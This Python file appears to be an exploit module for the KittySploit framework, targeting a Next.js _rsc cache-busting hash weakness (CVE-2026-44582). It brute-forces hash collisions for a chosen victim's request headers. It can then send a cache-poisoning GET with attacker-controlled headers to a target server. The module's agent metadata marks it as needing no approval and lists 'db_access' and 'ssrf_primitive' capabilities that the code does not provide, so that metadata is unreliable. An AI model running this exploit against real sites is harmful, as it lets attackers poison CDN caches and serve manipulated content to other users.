#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import secrets
import time
from urllib.parse import unquote

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js _rsc weak cache-busting hash collision (CVE-2026-44582)",
        "description": (
            "Reimplements the legacy 32-bit FNV-style mix and runs a birthday search for a colliding "
            "(state-tree, next-url) tuple. Optional HTTP GET with RSC prefetch headers can probe CDN "
            "cache behaviour. CPU-heavy; patched Next.js uses a stronger mix (>= 16.2.5)."
        ),
        "author": ["KittySploit Team"],
        "cve": "CVE-2026-44582",
        "references": ["https://github.com/advisories/GHSA-vfv6-92ff-j949"],
        "tags": ["http", "nextjs", "rsc", "cache", "hash", "collision"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints', 'params'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    victim_prefetch = OptString("1", "Victim tuple: Next-Router-Prefetch", required=False, advanced=True)
    victim_segment_prefetch = OptString("/_tree", "Victim tuple: segment prefetch", required=False, advanced=True)
    victim_state_tree = OptString(
        '%5B%22%22%2C%7B%22a%22%3A%22victim%22%7D%5D',
        "Victim tuple: state tree (URL-encoded)",
        required=False,
        advanced=True,
    )
    victim_next_url = OptString("/dashboard", "Victim tuple: next-url", required=False, advanced=True)
    max_attempts = OptInteger(5_000_000, "Max random trials for birthday search", required=False)
    check_max_attempts = OptInteger(300_000, "Max trials for check() only (faster cap)", required=False, advanced=True)
    send_poison_request = OptBool(
        False,
        "After a collision, GET ?_rsc=<hash> with attacker tuple headers (cache probe)",
        required=False,
    )

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _verify_proxies(self):
        verify = self._to_bool(self._o(self.verify_ssl))
        px = str(self._o(self.proxy) or "").strip()
        proxies = {}
        if px:
            proxies = {"http": px, "https": px}
        elif self.framework and getattr(self.framework, "is_tor_enabled", lambda: False)():
            tor = self.framework.tor_manager.get_tor_proxy_dict()
            if tor:
                proxies = tor
        elif self.framework and getattr(self.framework, "is_proxy_enabled", lambda: False)():
            u = self.framework.get_proxy_url()
            if u:
                proxies = {"http": u, "https": u, "all": u}
        return verify, proxies or None

    @staticmethod
    def legacy_hash(prefetch: str, segment_prefetch: str, state_tree: str, next_url: str) -> str:
        s = f"{prefetch}|{segment_prefetch}|{state_tree}|{next_url}"
        h = 0x811C9DC5
        for ch in s:
            h ^= ord(ch)
            h = (h * 0x01000193) & 0xFFFFFFFF
        return Module._to_base36(h)

    @staticmethod
    def _to_base36(n: int) -> str:
        n &= 0xFFFFFFFF
        if n == 0:
            return "0"
        digits = "0123456789abcdefghijklmnopqrstuvwxyz"
        out = []
        while n:
            n, r = divmod(n, 36)
            out.append(digits[r])
        return "".join(reversed(out))

    def _victim_tuple(self):
        return {
            "prefetch": str(self._o(self.victim_prefetch) or "1").strip() or "1",
            "segment_prefetch": str(self._o(self.victim_segment_prefetch) or "/_tree").strip() or "/_tree",
            "state_tree": str(self._o(self.victim_state_tree) or "").strip()
            or '%5B%22%22%2C%7B%22a%22%3A%22victim%22%7D%5D',
            "next_url": str(self._o(self.victim_next_url) or "/dashboard").strip() or "/dashboard",
        }

    def find_collision(self, target_hash: str, max_attempts: int):
        fixed_pf = "1"
        fixed_sp = "/_tree"
        start = time.perf_counter()
        attempts = 0
        while attempts < max_attempts:
            n = secrets.randbits(48)
            state_tree = f'%5B%22%22%2C%7B%22a%22%3A%22{n:x}%22%7D%5D'
            next_url = f"/p{n & 0xFFFF:04x}"
            h = self.legacy_hash(fixed_pf, fixed_sp, state_tree, next_url)
            attempts += 1
            if h == target_hash:
                return {
                    "prefetch": fixed_pf,
                    "segment_prefetch": fixed_sp,
                    "state_tree": state_tree,
                    "next_url": next_url,
                    "hash": h,
                    "attempts": attempts,
                    "elapsed_s": time.perf_counter() - start,
                }
        return None

    def _send_poison(self, target_hash: str, coll: dict) -> dict:
        verify, proxies = self._verify_proxies()
        url = f"{self._url()}?_rsc={target_hash}"
        st_dec = unquote(coll["state_tree"])
        headers = {
            "RSC": "1",
            "Next-Router-Prefetch": coll["prefetch"],
            "Next-Router-Segment-Prefetch": coll["segment_prefetch"],
            "Next-Router-State-Tree": st_dec,
            "Next-Url": coll["next_url"],
        }
        try:
            r = requests.get(url, headers=headers, timeout=float(self._o(self.timeout)), verify=verify, proxies=proxies)
            return {
                "ok": True,
                "status": r.status_code,
                "cache_control": r.headers.get("Cache-Control", ""),
                "age": r.headers.get("Age", ""),
                "body_len": len(r.content[:2048]),
            }
        except requests.RequestException as e:
            return {"ok": False, "error": str(e)}

    def check(self):
        vt = self._victim_tuple()
        th = self.legacy_hash(vt["prefetch"], vt["segment_prefetch"], vt["state_tree"], vt["next_url"])
        cap = max(1000, int(self._o(self.check_max_attempts)))
        res = self.find_collision(th, cap)
        if not res:
            return {
                "vulnerable": False,
                "reason": f"No collision within {cap} attempts (try higher max_attempts / run)",
                "confidence": "low",
                "target_hash": th,
            }
        return {
            "vulnerable": True,
            "reason": f"Legacy hash collision in {res['attempts']:,} attempts ({res['elapsed_s']:.2f}s)",
            "confidence": "high",
            "target_hash": th,
            "collision": res,
        }

    def run(self) -> bool:
        vt = self._victim_tuple()
        th = self.legacy_hash(vt["prefetch"], vt["segment_prefetch"], vt["state_tree"], vt["next_url"])
        print_info("Victim tuple / target legacy _rsc hash:")
        for k, v in vt.items():
            print_status(f"  {k:>22} = {v!r}")
        print_status(f"  target_hash = {th}")

        cap = max(1000, int(self._o(self.max_attempts)))
        print_status(f"Birthday search (max {cap:,} attempts) …")
        res = self.find_collision(th, cap)
        if not res:
            print_error(f"No collision within {cap:,} attempts (patched hash or need more tries).")
            return False

        print_success(f"Collision in {res['attempts']:,} tries ({res['elapsed_s']:.2f}s)")
        print_status(f"  next-router-state-tree = {res['state_tree']}")
        print_status(f"  next-url               = {res['next_url']}")

        ah = self.legacy_hash(res["prefetch"], res["segment_prefetch"], res["state_tree"], res["next_url"])
        if ah != th:
            print_error("Internal hash mismatch.")
            return False

        if self._to_bool(self._o(self.send_poison_request)):
            print_status("Sending cache-poison probe GET …")
            probe = self._send_poison(th, res)
            print_status(f"  probe = {probe}")

        print_warning("Same _rsc= key can map CDN cache to attacker-controlled RSC if edge keys on query.")
        return True
